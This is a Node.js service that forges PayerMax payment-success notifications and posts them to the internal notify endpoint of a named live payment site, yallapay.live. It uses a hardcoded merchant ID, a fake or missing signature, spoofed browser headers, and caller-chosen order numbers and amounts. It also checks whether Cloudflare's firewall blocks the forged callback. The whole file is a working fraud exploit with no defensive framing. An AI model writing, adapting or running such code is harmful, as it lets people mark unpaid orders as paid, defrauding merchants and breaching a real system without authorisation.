// Render service: on request, POST the forged PayerMax notification to yallapay.live and return the result.
const http = require("http");
const https = require("https");
const crypto = require("crypto");

const PORT = process.env.PORT || 10000;

function getEgressIp() {
  return new Promise(res => {
    const r = https.get("https://api.ipify.org?format=json", { headers: { "User-Agent": "Mozilla/5.0" } }, resp => {
      let d = ""; resp.on("data", c => d += c); resp.on("end", () => { try { res(JSON.parse(d).ip); } catch (e) { res("err"); } });
    });
    r.on("error", () => res("err"));
    r.setTimeout(8000, () => { r.destroy(); res("timeout"); });
  });
}

function buildBody(order, amount, status, tradeToken) {
  const now = new Date().toISOString();
  return JSON.stringify({
    code: "APPLY_SUCCESS", msg: "", keyVersion: "1",
    appId: "04ce10e83c934f8d9d3b076b6cf22b47", merchantNo: "P01010114042389",
    notifyTime: now, notifyType: "PAYMENT",
    data: {
      outTradeNo: order, tradeToken: tradeToken,
      totalAmount: parseFloat(amount), currency: "SAR", country: "SA",
      status: status, completeTime: now,
      paymentDetails: [{ paymentMethodType: "CARD", targetOrg: "*" }],
      reference: "020213827524152",
    },
  });
}

function postToYalla(path, body, signHeader) {
  return new Promise(res => {
    const r = https.request({
      host: "www.yallapay.live", port: 443, path, method: "POST",
      headers: {
        "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body),
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/153.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.yallapay.live", "x-site": "1", "sign": signHeader,
        "Host": "www.yallapay.live",
      },
    }, resp => {
      let d = ""; resp.on("data", c => d += c);
      resp.on("end", () => res({ status: resp.statusCode, headers: resp.headers, body: d }));
    });
    r.on("error", e => res({ err: e.message.slice(0, 120) }));
    r.setTimeout(15000, () => { r.destroy(); res({ err: "timeout" }); });
    r.write(body); r.end();
  });
}

const server = http.createServer(async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "*");
  if (req.method === "OPTIONS") { res.writeHead(204); res.end(); return; }
  try {
    const url = new URL(req.url, "http://x");
    const order = url.searchParams.get("order") || "yap_260923065847291789838";
    const amount = url.searchParams.get("amount") || "43";
    const signMode = url.searchParams.get("sign") || "fake";
    const path = url.searchParams.get("path") || "/api/Internal/Notify";
    const status = url.searchParams.get("status") || "SUCCESS";
    const tradeToken = url.searchParams.get("tradeToken") || "T2026092306093073421547";

    let signHeader;
    if (signMode === "none") signHeader = "";
    else if (signMode === "fake") signHeader = crypto.randomBytes(256).toString("base64");
    else signHeader = signMode;

    const body = buildBody(order, amount, status, tradeToken);
    const egressIp = await getEgressIp();
    const result = await postToYalla(path, body, signHeader);

    const out = {
      egressIp,
      region: "render-oregon(us-west-2)",
      target: "https://www.yallapay.live" + path,
      signMode,
      order, amount,
      resp: result.err ? { err: result.err } : {
        status: result.status,
        headers: { "cf-ray": result.headers["cf-ray"], server: result.headers["server"] },
        body: (result.body || "").slice(0, 800),
      },
    };
    const isCF403 = result.status === 403 && /blocked|attention|cloudflare/i.test(result.body || "");
    out.wafVerdict = isCF403 ? "CF-403 BLOCKED" : (result.status === 403 ? "403 non-CF" : (result.status === 404 ? "404 REACHED APP" : "status " + result.status));
    res.setHeader("Content-Type", "application/json");
    res.end(JSON.stringify(out, null, 2));
  } catch (e) {
    res.setHeader("Content-Type", "application/json");
    res.end(JSON.stringify({ err: e.message }));
  }
});

server.listen(PORT, () => console.log("yallapay-notify listening on " + PORT));
